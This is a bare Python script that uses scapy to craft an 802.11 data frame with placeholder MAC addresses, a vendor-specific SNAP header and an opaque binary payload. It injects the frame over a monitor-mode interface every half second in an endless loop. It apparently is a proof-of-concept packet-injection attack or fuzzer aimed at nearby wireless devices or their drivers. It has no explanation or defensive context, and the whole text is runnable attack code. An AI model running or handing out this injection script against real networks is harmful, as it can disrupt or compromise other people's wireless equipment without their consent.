#!/usr/bin/python
import sys
from scapy.all import *

data = RadioTap()/Dot11(FCfield='from-DS',type=0x2, subtype=0x30,addr1="00:01:02:03:04:05", addr2="00:01:02:03:04:05", addr3="00:01:02:03:04:05", addr4="00:01:02:03:04:05")/LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0xb85, code=0xcccd)/Raw(load='\x00\x1b\xc0\xa8(\x1a\x01\xf4\x00\xe6\xc0\xa8(\x1a\x06\x17\x01\x0b\x07\x17\x17\x00\xabx\n^\x07x=\xc38\xc2Z6\xb2\x8a..?\x83\x93\x99')
conf.iface = "wlan0mon"
#sendp(data)
sendp(data,inter=.5,loop=1)